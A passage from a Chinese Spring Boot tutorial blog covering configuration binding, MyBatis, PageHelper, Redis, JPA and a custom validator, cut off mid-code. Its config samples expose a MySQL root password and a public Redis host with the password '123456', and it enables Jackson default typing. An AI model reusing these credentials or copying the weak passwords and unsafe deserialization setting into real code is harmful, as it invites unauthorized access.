<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pets:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">dog</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">pig</span></span><br></pre></td></tr></table></figure>

<p>行内写法</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pets:</span> [<span class="string">cat</span>,<span class="string">dog</span>,<span class="string">pig</span>]</span><br></pre></td></tr></table></figure>

<h3 id="属性文件配置"><a href="#属性文件配置" class="headerlink" title="属性文件配置"></a>属性文件配置</h3><p>导入配置文件处理器，编写配置就有提示</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入配置文件处理器，配置文件进行绑定就会有提示--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>yml文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">net:</span></span><br><span class="line">  <span class="attr">seehope:</span></span><br><span class="line">    <span class="attr">qq:</span></span><br><span class="line">      <span class="attr">appid:</span> <span class="string">hello</span></span><br><span class="line">      <span class="attr">appsecret:</span> <span class="string">seehope;</span></span><br></pre></td></tr></table></figure>

<p>JavaBean</p>
<blockquote>
<ul>
<li>将配置文件中配置的每一个属性的值，映射到这个组件中</li>
<li>@ConfigurationProperties：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定；</li>
<li>prefix = “person”：配置文件中哪个下面的所有属性进行一一映射</li>
<li>@Compoment只有这个组件是容器中的组件，才能容器提供的@ConfigurationProperties功能；</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;net.seehope&quot;)</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProjectProperties</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> QQProperties qq=<span class="keyword">new</span> QQProperties();</span><br><span class="line">	<span class="comment">//get,set</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QQProperties</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String appid;</span><br><span class="line">    <span class="keyword">private</span> String appsecret;</span><br><span class="line">	<span class="comment">//get,set</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>@Value获取值和@ConfigurationProperties获取值比较</p>
<table>
<thead>
<tr>
<th></th>
<th>@ConfigurationProperties</th>
<th>@Value</th>
</tr>
</thead>
<tbody><tr>
<td>功能</td>
<td>批量注入配置文件中的属性</td>
<td>一个个指定</td>
</tr>
<tr>
<td>松散绑定（松散语法）</td>
<td>支持</td>
<td>不支持</td>
</tr>
<tr>
<td>SpEL</td>
<td>不支持</td>
<td>支持</td>
</tr>
<tr>
<td>JSR303数据校验</td>
<td>支持</td>
<td>不支持</td>
</tr>
<tr>
<td>复杂类型封装</td>
<td>支持</td>
<td>不支持</td>
</tr>
</tbody></table>
<p>配置文件yml还是properties他们都能获取到值；</p>
<p>如果说，我们只是在某个业务逻辑中需要获取一下配置文件中的某项值，使用@Value；</p>
<p>如果说，我们专门编写了一个javaBean来和配置文件进行映射，我们就直接使用@ConfigurationProperties；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;$&#123;net.seehope.qq.appid&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String appid;</span><br><span class="line"><span class="meta">@Value(&quot;$&#123;net.seehope.qq.appsecret&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String appsecret;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201118113304037.png" alt="image-20201118113304037"></p>
<h1 id="3、整合"><a href="#3、整合" class="headerlink" title="3、整合"></a>3、整合</h1><h2 id="整合MyBatis"><a href="#整合MyBatis" class="headerlink" title="整合MyBatis"></a>整合MyBatis</h2><h3 id="简单整合"><a href="#简单整合" class="headerlink" title="简单整合"></a>简单整合</h3><p>1、导入myBatis依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//mybatis依赖</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//mysql-connector</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//druid连接池</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.22<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、配置数据库</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring</span>:<span class="string"></span></span><br><span class="line">  <span class="attr">datasource</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">url</span>: <span class="string">jdbc:mysql://localhost:3306/spring1</span></span><br><span class="line">    <span class="attr">username</span>: <span class="string">root</span></span><br><span class="line">    <span class="attr">password</span>: <span class="string">86795462m</span></span><br><span class="line">    <span class="meta">driver-class-name</span>: <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">mybatis</span>:<span class="string"></span></span><br><span class="line">  <span class="meta">mapper-locations</span>: <span class="string">classpath*:mappers/**/*.xml</span></span><br></pre></td></tr></table></figure>

<p>3、Mapper层</p>
<ul>
<li>在主配置类注解(包扫描)</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20201221121351142.png" alt="image-20201221121351142"></p>
<ul>
<li>在mapper层接口</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20201221121330308.png" alt="image-20201221121330308"></p>
<p>4、接口权限名的配置文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mapper.xml</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper</span><br><span class="line">        PUBLIC <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="line">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.example.demo.dm.mapper.AccountMapper&quot;</span>&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure>

<p>5、在配置文件配置mapper.xml文件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath*:mappers/**/*.xml</span></span><br></pre></td></tr></table></figure>

<p>  6、Controller层</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Controller层    </span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">insertUser</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span></span>&#123;</span><br><span class="line">        userMapper.insert(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a><strong>逆向工程</strong></h3><p>maven依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//通用mapper</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//mybatis.mapper</span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/tk.mybatis/mapper --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>tk.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mapper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//mybatis jar包</span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//数据库连接jar</span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>将工程置于同一工作空间，更改配置</li>
<li>运行MybatisGenerator.java</li>
</ul>
<img src="https://csn.damyoung.cn/image-20201111172158874.png" alt="image-20201111172158874" style="zoom:67%;" />

<img src="https://csn.damyoung.cn/image-20201111172213995.png" alt="image-20201111172213995" style="zoom:67%;" />

<img src="https://csn.damyoung.cn/image-20201111172307139.png" alt="image-20201111172307139" style="zoom:67%;" />

<img src="https://csn.damyoung.cn/image-20201111172316572.png" alt="image-20201111172316572" style="zoom: 67%;" />

<ul>
<li>主工程依赖</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//提供扫描</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>tk.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mapper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201111172619028.png" alt="image-20201111172619028" style="zoom:67%;" />

<h3 id="分页插件"><a href="#分页插件" class="headerlink" title="分页插件"></a>分页插件</h3><blockquote>
<p>当需要进行分页的MyBatis方法前调用PageHelper.startPage静态方法，在方法后的第一个Mybatis查询方法会被进行分页</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//分页组件</span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper-spring-boot-starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.pagehelper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pagehelper-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>PageHelper.startPage(index,count)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/6&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">hello5</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//分页，获取第二页，内容数为5</span></span><br><span class="line">    PageHelper.startPage(<span class="number">2</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> userMapper.selectAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="整合Redis"><a href="#整合Redis" class="headerlink" title="整合Redis"></a>整合Redis</h2><blockquote>
<p><strong>Redis的对象需要进行序列化</strong></p>
</blockquote>
<p>说明：在SpringBoot2.x后，原来使用的jedis被替换成lettuce</p>
<p>jedis: 采用的直连，多个线程操作的话，是不安全，避免不安全，使用jedis pool ,更像是BIO模式</p>
<p>lettuce: 采用netty，实例可以在多个线程中进行共享，不存在线程不安全的情况，可以减少线程数据，更像是NIO模式</p>
<blockquote>
<p>Springboot自动在容器内帮我们生成了一个RedisTemplate和一个StringRedisTemplate,我们在项目内直接可以引入使用。</p>
<p>这个RedisTemplate的泛型是&lt;Object,Object&gt;我们用起来不是很方便，要各种转换类型，我们需要新建一个泛型&lt;String,Object&gt;的RedisTemplate</p>
</blockquote>
<p>源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//RedisAutoConfiguration类</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(name = &quot;redisTemplate&quot;)</span> <span class="comment">//可以自定义一个redisTemplate来覆盖原来的</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> RedisTemplate&lt;Object, Object&gt; <span class="title">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> UnknownHostException </span>&#123;</span><br><span class="line">    <span class="comment">//默认RedisTemplate没有过多的配置，redis对象都是需要序列化</span></span><br><span class="line">    RedisTemplate&lt;Object, Object&gt; template = <span class="keyword">new</span> RedisTemplate&lt;&gt;();</span><br><span class="line">    template.setConnectionFactory(redisConnectionFactory);</span><br><span class="line">    <span class="keyword">return</span> template;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span> <span class="comment">//String是redis最常使用的类型</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> StringRedisTemplate <span class="title">stringRedisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> UnknownHostException </span>&#123;</span><br><span class="line">    StringRedisTemplate template = <span class="keyword">new</span> StringRedisTemplate();</span><br><span class="line">    template.setConnectionFactory(redisConnectionFactory);</span><br><span class="line">    <span class="keyword">return</span> template;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    redis依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--      对象池依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-pool2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Redis配置</span></span><br><span class="line"><span class="string">spring.redis.host=42.192.130.130</span></span><br><span class="line"><span class="string">spring.redis.password=123456</span></span><br><span class="line"><span class="string">spring.redis.port=6379</span></span><br><span class="line"><span class="comment">#spring.redis.password=root #根据需要</span></span><br><span class="line"><span class="comment"># 连接超时时间（毫秒）</span></span><br><span class="line"><span class="string">spring.redis.timeout=10000</span></span><br><span class="line"><span class="comment"># Redis默认情况下有16个分片，这里配置具体使用的分片，默认是0</span></span><br><span class="line"><span class="string">spring.redis.database=0</span></span><br><span class="line"><span class="comment"># 连接池最大连接数（使用负值表示没有限制） 默认 8</span></span><br><span class="line"><span class="string">spring.redis.lettuce.pool.max-active=8</span></span><br><span class="line"><span class="comment"># 连接池最大阻塞等待时间（使用负值表示没有限制） 默认 -1</span></span><br><span class="line"><span class="string">spring.redis.lettuce.pool.max-wait=-1</span></span><br><span class="line"><span class="comment"># 连接池中的最大空闲连接 默认 8</span></span><br><span class="line"><span class="string">spring.redis.lettuce.pool.max-idle=8</span></span><br><span class="line"><span class="comment"># 连接池中的最小空闲连接 默认 0</span></span><br><span class="line"><span class="string">spring.redis.lettuce.pool.min-idle=0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//固定模板</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisConfig</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 配置RedisTemplate&lt;String,Object&gt;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RedisTemplate&lt;String,Object&gt; <span class="title">redisTemplate</span><span class="params">(RedisConnectionFactory factory)</span></span>&#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> RedisTemplate&lt;String, Object&gt;();</span><br><span class="line">        template.setConnectionFactory(factory);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//序列化配置</span></span><br><span class="line">        <span class="comment">//json对象序列化</span></span><br><span class="line">        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = <span class="keyword">new</span> Jackson2JsonRedisSerializer(Object.class);</span><br><span class="line">        ObjectMapper om = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);</span><br><span class="line">        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line">        jackson2JsonRedisSerializer.setObjectMapper(om);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//String的序列化</span></span><br><span class="line">        StringRedisSerializer stringRedisSerializer = <span class="keyword">new</span> StringRedisSerializer();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// key采用String的序列化方式</span></span><br><span class="line">        template.setKeySerializer(stringRedisSerializer);</span><br><span class="line">        <span class="comment">// hash的key也采用String的序列化方式</span></span><br><span class="line">        template.setHashKeySerializer(stringRedisSerializer);</span><br><span class="line">        <span class="comment">// value序列化方式采用jackson</span></span><br><span class="line">        template.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        <span class="comment">// hash的value序列化方式采用jackson</span></span><br><span class="line">        template.setHashValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">        template.afterPropertiesSet();</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test_1</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate&lt;String,String&gt;redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">()</span></span>&#123;</span><br><span class="line">        redisTemplate.opsForValue().set(<span class="string">&quot;myKey&quot;</span>,<span class="string">&quot;myValue&quot;</span>);</span><br><span class="line">        System.out.println(redisTemplate.opsForValue().get(<span class="string">&quot;myKey&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="整合SpringData-JPA"><a href="#整合SpringData-JPA" class="headerlink" title="整合SpringData JPA"></a>整合SpringData JPA</h2><blockquote>
<p>Java persistence API</p>
<p>为了简化构建基于 Spring 框架应用的<strong>数据访问技术</strong>，包括非关系数据库、 Map-Reduce 框架、云数据服务等等；</p>
<p>另外也包含对关系型数据库的访问支持</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180306105412.png" alt="搜狗截图20180306105412"></p>
<p>编写一个实体类（bean）和数据表进行映射，并且配置好映射关系；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="comment">//使用JPA注解配置映射关系</span></span><br><span class="line"><span class="meta">@Entity</span> <span class="comment">//告诉JPA这是一个实体类(和数据表映射的类)</span></span><br><span class="line"><span class="meta">@Table(name = &quot;tb1_teacher&quot;)</span> <span class="comment">//@Table来指定和那个数据表对应</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Id</span> <span class="comment">//这是一个主键</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span> <span class="comment">//自增主键</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(name = &quot;last_name&quot;,length = 50)</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column</span> <span class="comment">//省略默认列名就是属性名</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写一个Dao接口来操作实体类对应的数据表（Repository）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//继承JpaRepository来完成对数据库的操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">User</span>,<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基本的配置JpaProperties</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span>  </span><br><span class="line"> <span class="attr">jpa:</span></span><br><span class="line">    <span class="attr">hibernate:</span></span><br><span class="line"><span class="comment">#     更新或者创建数据表结构</span></span><br><span class="line">      <span class="attr">ddl-auto:</span> <span class="string">update</span></span><br><span class="line"><span class="comment">#    控制台显示SQL</span></span><br><span class="line">    <span class="attr">show-sql:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>



<h1 id="4、使用"><a href="#4、使用" class="headerlink" title="4、使用"></a>4、使用</h1><h2 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a><strong>自定义注解</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(&#123; ElementType.METHOD, ElementType.FIELD &#125;)</span></span><br><span class="line"><span class="meta">@Retention(value = RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Constraint(validatedBy = UsernameIsExistsProcessor.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> UsernameIsExistsAnnotation &#123;</span><br><span class="line">    <span class="function">String <span class="title">message</span><span class="params">()</span> <span class="keyword">default</span> &quot;</span>&#123;com.example.validator.annotation.UsernameIsExistsAnnotation.message&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Class&lt;?&gt;[] groups() default &#123;&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Class&lt;? extends Payload&gt;[] payload() default &#123;&#125;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UsernameIsExistsProcessor</span> <span class="keyword">implements</span> <span class="title">ConstraintValidator</span>&lt;<span class="title">UsernameIsExistsAnnotation</span>,<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(UsernameIsExistsAnnotation usernameIsExistsAnnotation)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(Object o, ConstraintValidatorContext constraintValidatorContext)</span> 